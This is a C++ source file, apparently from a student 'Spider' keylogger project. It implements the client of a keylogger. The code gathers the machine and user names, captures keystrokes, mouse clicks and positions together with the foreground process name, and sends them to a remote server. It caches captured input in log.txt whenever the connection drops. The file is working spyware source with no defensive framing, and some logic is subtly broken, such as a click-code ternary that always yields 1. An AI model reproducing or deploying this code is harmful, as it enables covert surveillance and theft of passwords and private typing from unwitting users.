#include <utility>
#include <vector>
#include "stdafx.h"
#include "BoostNetwork.h"

void				Client::sendData(Client& c)
{
	try
	{
		while (true) {
			//if (!c.isFileEmpty())
			//	return c.readMessage(); // log.txt
			if ((!c._msgQ.isEmpty()))
				c.getMessageQ();
			else if (!c._data._keys.isEmpty())
				c.getMessage();
		}
	}
	catch (std::exception& e)
	{
		std::cerr << e.what() << std::endl;
	}
}

/* GET MESSAGE FOR LOG FILE DISCONNECTED */

void			Client::getMessage(Spider::RequestCode code,
									const std::shared_ptr<IInput>& info)
{
	fnctQ					f;

	auto				it = _sendListQ.find(code);

	if (it != _sendListQ.end())
	{
		f = it->second;
		return 	((this->*f)());
	}
	if (!info)
	{
		gMutex.lock();
		if (_data._state.isTrackingActivated() || _data._state.isClickActivated())
		{
			gMutex.unlock();
			responseMouseEvent(info);
			gMutex.lock();
		}
		if (_data._state.isKbActivated())
		{
			gMutex.unlock();
			responseKeyEvent(info);
			gMutex.lock();
		}
		gMutex.unlock();
	}
	else
		return response(code);
}

/* GET MESSAGE WHILE CONNECTED */

void			Client::getMessageQ()
{
	std::shared_ptr<WindowsInput>		info;
	Spider::RequestCode		tmpCode;
	fnctQ					f;

	_msgQ.tryPop(tmpCode);

	auto				it = _sendListQ.find(tmpCode);

	if (it != _sendListQ.end())
	{
		f = it->second;
		return 	((this->*f)());
	}
	return response(tmpCode);
}

void			Client::getMessage()
{
	std::shared_ptr<IInput>		info;
	gMutex.lock();
	if (!_data._keys.isEmpty())
		_data._keys.tryPop(info);
	gMutex.unlock();

	gMutex.lock();
	if (_data._state.isTrackingActivated() || _data._state.isClickActivated())
	{
		gMutex.unlock();
		responseMouseEvent(info);
		gMutex.lock();
	}
	if (_data._state.isKbActivated())
	{
		gMutex.unlock();
		responseKeyEvent(info);
		gMutex.lock();
	}
	gMutex.unlock();
}

void			Client::responseClientId()
{	
	TCHAR			computerName[MAX_COMPUTERNAME + 1];
	TCHAR			userName[MAX_COMPUTERNAME + 1];
	DWORD			size = MAX_COMPUTERNAME;

	GetComputerName(computerName, &size);
	GetUserName(userName, &size);

	std::cout << computerName << std::endl;
	std::cout << userName << std::endl;

	std::vector<char>		buffers;
	
	unsigned int i;
	int tmp = static_cast<int>(Spider::VALID_ASK_ID_RESPONSE);

	for (i = 0; i < sizeof(int); i++)
		buffers.push_back((reinterpret_cast<char *>(&tmp))[i]);
	for (i = 0; i < sizeof(char[256]); i++)
		buffers.push_back(computerName[i]);
	for (i = 0; i < sizeof(char[256]); i++)
		buffers.push_back(userName[i]);
	try {
		_network->send(buffers);
	}
	catch (const std::exception &e) {
		std::cerr << e.what() << std::endl;
		_network->setIsConnected(false);
		return storeMessage(Spider::VALID_ASK_ID_RESPONSE);
	}
}

void			Client::responseMouseEvent(const std::shared_ptr<IInput>& info)
{
	if (!info)
		return;

	std::vector<char>		buffers;

	unsigned int i;
	int tmp = static_cast<int>(Spider::VALID_MOUSE_EVENT);
	int time = info->getTime();
	int mousex = std::get<0>(info->getMouseInput());
	int mousey = std::get<1>(info->getMouseInput());
	int	key = 0 ;

	if (mousex == -1 && mousey == -1)
		return;

	gMutex.lock();
	if (_data._state.isClickActivated())
	{
		key = static_cast<int>(info->getKeyInput());
		key = 516 ? 1 : 513 ? 2 : 3;
	}

	gMutex.unlock();
	for (i = 0; i < sizeof(int); i++)
		buffers.push_back((reinterpret_cast<char *>(&tmp))[i]);
	for (i = 0; i < sizeof(int); i++)
		buffers.push_back((reinterpret_cast<char *>(&time))[i]);

	for (i = 0; i < sizeof(char[255]); i++)
		buffers.push_back(info->getProcessus()[i]);
	buffers.push_back('\0');
	for (i = 0; i < sizeof(int); i++)
		buffers.push_back((reinterpret_cast<char *>(&mousex))[i]);
	for (i = 0; i < sizeof(int); i++)
		buffers.push_back((reinterpret_cast<char *>(&mousey))[i]);
	for (i = 0; i < sizeof(int); i++)
		buffers.push_back((reinterpret_cast<char *>(&key))[i]);
	
	try {
		_network->send(buffers);
	}
	catch (const std::exception &e) {
		std::cerr << e.what() << std::endl;
		_network->setIsConnected(false);
		return storeMessage(info, Spider::VALID_MOUSE_EVENT);
	}
}

void			Client::responseKeyEvent(const std::shared_ptr<IInput>& info)
{
	if (!info)
		return;

	std::vector<char>		buffers;

	unsigned int i;
	int tmp = static_cast<int>(Spider::VALID_KEY_EVENT);
	int time = info->getTime();
	int key = info->getKeyInput();

	if (key == 513 || key == 516)
		return;
	for (i = 0; i < sizeof(int); i++)
		buffers.push_back((reinterpret_cast<char *>(&tmp))[i]);
	for (i = 0; i < sizeof(int); i++)
		buffers.push_back((reinterpret_cast<char *>(&time))[i]);

	for (i = 0; i < sizeof(char[255]); i++)
		buffers.push_back(info->getProcessus()[i]);
	buffers.push_back('\0');

	for (i = 0; i < sizeof(int); i++)
		buffers.push_back((reinterpret_cast<char *>(&key))[i]);

	try {
		_network->send(buffers);
	}
	catch (const std::exception &e) {
		std::cerr << e.what() << std::endl;
		_network->setIsConnected(false);
		return storeMessage(info, Spider::VALID_KEY_EVENT);
	}
}

void			Client::responseShutdown()
{
	std::vector<char>	Code;

	int tmp = static_cast<int>(Spider::VALID_DISCONNECT);

	for (unsigned i = 0; i < sizeof(int); i++)
		Code.push_back((reinterpret_cast<char *>(&tmp))[i]);

	try {
		_network->send(Code);
		_network->disconnect();
	}
	catch (const std::exception &e) {
		std::cerr << e.what() << std::endl;
		_network->setIsConnected(false);
		return storeMessage(Spider::VALID_DISCONNECT);
	}
}

void			Client::responseStatus()
{
	std::vector<char>		buffers;

	unsigned int i;
	int tmp = static_cast<int>(Spider::VALID_GET_STATUS_RESPONSE);
	bool kbActivate = _data._state.isKbActivated();
	bool clickActivate = _data._state.isClickActivated();
	bool trackActivate = _data._state.isTrackingActivated();
	bool pause = _data._state.isPaused();

	
	for (i = 0; i < sizeof(int); i++)
		buffers.push_back((reinterpret_cast<char *>(&tmp))[i]);
	for (i = 0; i < sizeof(bool); i++)
		buffers.push_back((reinterpret_cast<char *>(&kbActivate))[i]);
	for (i = 0; i < sizeof(bool); i++)
		buffers.push_back((reinterpret_cast<char *>(&clickActivate))[i]);
	for (i = 0; i < sizeof(bool); i++)
		buffers.push_back((reinterpret_cast<char *>(&trackActivate))[i]);
	for (i = 0; i < sizeof(bool); i++)
		buffers.push_back((reinterpret_cast<char *>(&pause))[i]);

	try {
		_network->send(buffers);
	}
	catch (const std::exception &e) {
		std::cerr << e.what() << std::endl;
		_network->setIsConnected(false);
		return storeMessage(NULL, Spider::VALID_GET_STATUS_RESPONSE);
	}
}

void			Client::response(Spider::RequestCode code)
{
	std::vector<char>	Code;

	int tmp = static_cast<int>(code);

	for (unsigned i = 0; i < sizeof(int); i++)
		Code.push_back((reinterpret_cast<char *>(&tmp))[i]);

	try {
		_network->send(Code);
	}
	catch (const std::exception &e) {
		std::cerr << e.what() << std::endl;
		_network->setIsConnected(false);
		return storeMessage(code);
	}
}

/* WRITE/READ IN FILE LOG.TXT */
/* / -> code Request (Message Begin) */
/* ! -> WindowsInput object info */
/* * -> Status object info */
/* _ -> end of message */

void			Client::changeLog()
{
	std::ifstream	inFile;
	std::string		str;
	std::string		msg;
	inFile.open("log.txt");
	while (std::getline(inFile, str))
		if (str == "_")
			break;
	while (std::getline(inFile, str))
		msg += str;
	inFile.close();

	std::ofstream	outFile;

	outFile.open("log.txt", std::ios::trunc);
	outFile << msg;
}

void			Client::readMessage()
{
	std::shared_ptr<IInput>		info;
	char						proc[256];
	std::vector<std::string>	buf(5, "");
	std::string					tmp;
	Spider::RequestCode	code;
	std::istringstream os;
	std::ifstream	saveFile;
	std::string		str;
	saveFile.open("log.txt");

	std::memset(&proc[0], 0, sizeof(proc));

	if (saveFile.is_open())
	{
		while (!saveFile.eof())
		{
			getline(saveFile, str);
			std::cout << str << std::endl;
			switch (str.c_str()[0])
			{
			case '/':
				code = static_cast<Spider::RequestCode>(std::stoi(&str[1]));
				break;
			case '!':
				os.str(&str.c_str()[1]);
				for (size_t i = 0; i < 5; i++)
				{
					os >> tmp;
					buf[i] = tmp;
				}
				std::memcpy(proc, &(buf[4])[0], 256);
				info = std::make_shared<WindowsInput>
					(
						std::stoi(buf[0]),
						std::pair<int, int>(std::stoi(buf[1]), std::stoi(buf[2])),
						std::stoi(buf[3]),
						proc
					);
				break;
			case '*':
				os.str(&str.c_str()[1]);
				bool		data;
				os >> data;
				_tmpState.setPause(data);
				os >> data;
				_tmpState.setClick(data);
				os >> data;
				_tmpState.setTracking(data);
				os >> data;
				_tmpState.setKb(data);
				break;
			case '_':
				saveFile.close();
				break;
			default:
				//error
				break;
			}
		}
	}
	return;
}

void			Client::storeMessage(const std::shared_ptr<IInput>& info, Spider::RequestCode code)
{
	std::ofstream saveFile;
	saveFile.open("log.txt", std::ios::app);
	saveFile << "/" << code << std::endl;

	if (info)
	{
		saveFile << "!";
		saveFile << info->getKeyInput();
		saveFile << " " << std::get<0>(info->getMouseInput());
		saveFile << " " << std::get<1>(info->getMouseInput());
		saveFile << " " << info->getTime();
		saveFile << " " << info->getProcessus() << std::endl;
	}
	saveFile << "*";
	saveFile << _data._state.isPaused();
	saveFile << " " << _data._state.isClickActivated();
	saveFile << " " << _data._state.isTrackingActivated();
	saveFile << " " << _data._state.isKbActivated() << std::endl;

	saveFile << "_" << std::endl;
	saveFile.close();
}

void			Client::storeMessage(Spider::RequestCode code)
{
	std::ofstream saveFile;
	saveFile.open("log.txt", std::ios::app);
	saveFile << "/" << code << std::endl;
	saveFile << "_" << std::endl;
	saveFile.close();
}

bool			Client::isFileEmpty()
{
	std::ifstream file("log.txt");
	return file.peek() == std::ifstream::traits_type::eof();
}